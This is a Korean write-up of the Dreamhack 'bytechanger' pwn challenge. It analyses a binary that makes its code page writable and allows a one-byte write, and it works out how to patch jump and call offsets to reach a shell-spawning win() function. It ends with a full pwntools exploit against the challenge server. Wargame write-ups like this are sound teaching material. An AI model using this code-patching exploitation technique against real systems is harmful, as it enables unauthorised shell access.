---
title: "bytechanger writeup"
date: 2026-04-27 01:40:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, opcode, dreamhack]
---

## Analysis

### checksec
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### Source Code
```c
int win()
{
  return system("/bin/sh");
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+7h] [rbp-19h] BYREF
  __int64 v5; // [rsp+8h] [rbp-18h] BYREF
  void *addr; // [rsp+10h] [rbp-10h]
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 0);
  setvbuf(stderr, nullptr, 2, 0);
  addr = (void *)((unsigned __int64)main & 0xFFFFFFFFFFFFF000LL);
  mprotect((void *)((unsigned __int64)main & 0xFFFFFFFFFFFFF000LL), 0x1000u, 7);
  printf("change only 1 byte (idx): ");
  __isoc99_scanf("%lu", &v5);
  printf("change to (val): ");
  __isoc99_scanf("%hhu", &v4);
  *((_BYTE *)addr + v5) = v4;
  return 0;
}
```

## Vulnerability Analysis

`win()`이 주어지고, 소스코드의 흐름을 요약하면 `main`의 코드가 적재된 페이지를 읽기, 쓰기, 실행 모두 가능하게 권한을 설정한 후 인덱스와 1바이트 값을 입력받아 원하는 위치에 입력한 1바이트를 쓰고 종료한다.

이 1바이트 쓰기를 어떻게 활용할 수 있을지 파악하기 위해 우선 `main`의 어셈블리를 봐야 하고 `win()`의 오프셋도 확인해야 한다.

```
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000001203 <+0>:     endbr64 
   0x0000000000001207 <+4>:     push   rbp
   0x0000000000001208 <+5>:     mov    rbp,rsp
   0x000000000000120b <+8>:     sub    rsp,0x20
   0x000000000000120f <+12>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000001218 <+21>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000000121c <+25>:    xor    eax,eax
   0x000000000000121e <+27>:    mov    rax,QWORD PTR [rip+0x2e0b]        # 0x4030 <stdin@GLIBC_2.2.5>
   0x0000000000001225 <+34>:    mov    ecx,0x0
   0x000000000000122a <+39>:    mov    edx,0x2
   0x000000000000122f <+44>:    mov    esi,0x0
   0x0000000000001234 <+49>:    mov    rdi,rax
   0x0000000000001237 <+52>:    call   0x10d0
   0x000000000000123c <+57>:    mov    rax,QWORD PTR [rip+0x2ddd]        # 0x4020 <stdout@GLIBC_2.2.5>
   0x0000000000001243 <+64>:    mov    ecx,0x0
   0x0000000000001248 <+69>:    mov    edx,0x2
   0x000000000000124d <+74>:    mov    esi,0x0
   0x0000000000001252 <+79>:    mov    rdi,rax
   0x0000000000001255 <+82>:    call   0x10d0
   0x000000000000125a <+87>:    mov    rax,QWORD PTR [rip+0x2ddf]        # 0x4040 <stderr@GLIBC_2.2.5>
   0x0000000000001261 <+94>:    mov    ecx,0x0
   0x0000000000001266 <+99>:    mov    edx,0x2
   0x000000000000126b <+104>:   mov    esi,0x0
   0x0000000000001270 <+109>:   mov    rdi,rax
   0x0000000000001273 <+112>:   call   0x10d0
   0x0000000000001278 <+117>:   lea    rax,[rip+0xffffffffffffff84]        # 0x1203 <main>
   0x000000000000127f <+124>:   and    rax,0xfffffffffffff000
   0x0000000000001285 <+130>:   mov    QWORD PTR [rbp-0x10],rax
   0x0000000000001289 <+134>:   mov    rax,QWORD PTR [rbp-0x10]
   0x000000000000128d <+138>:   mov    edx,0x7
   0x0000000000001292 <+143>:   mov    esi,0x1000
   0x0000000000001297 <+148>:   mov    rdi,rax
   0x000000000000129a <+151>:   call   0x10e0
   0x000000000000129f <+156>:   lea    rax,[rip+0xd66]        # 0x200c
   0x00000000000012a6 <+163>:   mov    rdi,rax
   0x00000000000012a9 <+166>:   mov    eax,0x0
   0x00000000000012ae <+171>:   call   0x10c0
   0x00000000000012b3 <+176>:   lea    rax,[rbp-0x18]
   0x00000000000012b7 <+180>:   mov    rsi,rax
   0x00000000000012ba <+183>:   lea    rax,[rip+0xd66]        # 0x2027
   0x00000000000012c1 <+190>:   mov    rdi,rax
   0x00000000000012c4 <+193>:   mov    eax,0x0
   0x00000000000012c9 <+198>:   call   0x10f0
   0x00000000000012ce <+203>:   lea    rax,[rip+0xd56]        # 0x202b
   0x00000000000012d5 <+210>:   mov    rdi,rax
   0x00000000000012d8 <+213>:   mov    eax,0x0
   0x00000000000012dd <+218>:   call   0x10c0
   0x00000000000012e2 <+223>:   lea    rax,[rbp-0x19]
   0x00000000000012e6 <+227>:   mov    rsi,rax
   0x00000000000012e9 <+230>:   lea    rax,[rip+0xd4d]        # 0x203d
   0x00000000000012f0 <+237>:   mov    rdi,rax
   0x00000000000012f3 <+240>:   mov    eax,0x0
   0x00000000000012f8 <+245>:   call   0x10f0
   0x00000000000012fd <+250>:   mov    rdx,QWORD PTR [rbp-0x18]
   0x0000000000001301 <+254>:   mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000001305 <+258>:   add    rax,rdx
   0x0000000000001308 <+261>:   mov    rdx,rax
   0x000000000000130b <+264>:   movzx  eax,BYTE PTR [rbp-0x19]
   0x000000000000130f <+268>:   mov    BYTE PTR [rdx],al
   0x0000000000001311 <+270>:   mov    eax,0x0
   0x0000000000001316 <+275>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000000131a <+279>:   sub    rdx,QWORD PTR fs:0x28
   0x0000000000001323 <+288>:   je     0x132a <main+295>
   0x0000000000001325 <+290>:   call   0x10a0
   0x000000000000132a <+295>:   leave  
   0x000000000000132b <+296>:   ret    
End of assembler dump.
pwndbg> p win
$1 = {<text variable, no debug info>} 0x11e9 <win>
```

점프하는 명령어들은 모두 상대 주소로 점프하고 있다. `win()`을 실행시키려면 점프해야 하니 활용할 명령어들을 점프 명령어로 좁히고, 입력 이후에 점프해야 하니 점프 명령어들을 `main+288`, `main+290`으로 좁혀서 생각해보자. `win()`의 오프셋은 두 점프보다 낮은 주소에 있으므로 역방향으로 점프해야 한다. 그리고 두 점프의 오프셋을 1바이트만 수정해서 `win()`의 오프셋으로 바꿀 수는 없다. 따라서 한 번의 1바이트 쓰기만으로는 `win()`을 실행시킬 수 없다.

그렇다면 결국 여러 번 써야 한다는 결론이 나오고, 이를 위해 쓰기 이후 `scanf`로 점프시켜야 한다. `main+288`에서 `scanf` 하는 부분으로 점프하게 만들면 원하는 만큼 여러 번 원하는 위치에 쓸 수 있다. 이를 통해 `main+290`의 명령어 오프셋 부분을 `win()`을 실행하도록 구성할 수 있다.

`main+288`은 거리가 5밖에 차이가 나지 않으니 `JE rel8` 형태일 것이다(명령어에 대한 정보는 https://www.felixcloutier.com/x86/ 에서 확인할 수 있다). `main+288`에서 `scanf` 하는 위치인 `main+176`까지의 거리가 1바이트로 충분하니 1바이트 쓰기로 `scanf`로 점프하도록 할 수 있다. 이를 위해 정확한 오프셋 계산이 필요하다.

```
pwndbg> p 0x12b3-0x1325
$2 = -114
pwndbg> p/x -114
$3 = 0xffffff8e
pwndbg> p 0x8e
$4 = 142
```

점프 명령어의 오프셋 부분은 다음 명령어를 기준으로 계산해야 한다. `main+288`에서 `main+176`까지의 거리는 -114이고, 이 값은 2의 보수로 `0x8e`, 10진수로는 142이다. 그리고 `main+288` 명령어 자체의 페이지 오프셋은 `0x323`, 10진수로는 803이다. `main+288`의 opcode는 `74 cb(code byte)`이므로 오프셋에 해당하는 위치는 명령어 위치 + 1인 804이다.

이제 `main+290`의 명령어 오프셋 부분을 덮기 위해 오프셋을 계산해야 한다.

```
pwndbg> p 0x11e9-0x132a
$7 = -321
pwndbg> p/x -321
$8 = 0xfffffebf
pwndbg> p 0xbf
$9 = 191
pwndbg> p 0xfe
$10 = 254
```

`main+290`에서 `win()`까지의 거리는 -321이고, 2의 보수로는 `0xfffffebf`이다. 여기서 상위 2바이트는 수정하지 않아도 된다. 기존 `main+290` 오프셋 자체가 백워드 점프이고 상위 2바이트가 이미 `0xffff`이기 때문이다. 따라서 하위 2바이트만 `0xbf`, `0xfe`로 덮으면 된다. 그리고 `main+290` 명령어 자체의 페이지 오프셋은 `0x325`, 10진수로는 805이다. `call` 명령어는 `CALL rel32` 형태이며 opcode는 `E8 cd(code double word)`이다. 따라서 오프셋 위치는 opcode 1바이트를 더한 806이다.

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 10780)

    return r


def main():
    r = conn()

    r.sendlineafter(b": ", b"804")
    r.sendlineafter(b": ", b"142")

    r.sendline(b"806")
    r.sendlineafter(b": ", b"191")

    r.sendline(b"807")
    r.sendlineafter(b": ", b"254")

    r.sendline(b"804")
    r.sendlineafter(b": ", b"0")

    r.interactive()


if __name__ == "__main__":
    main()
```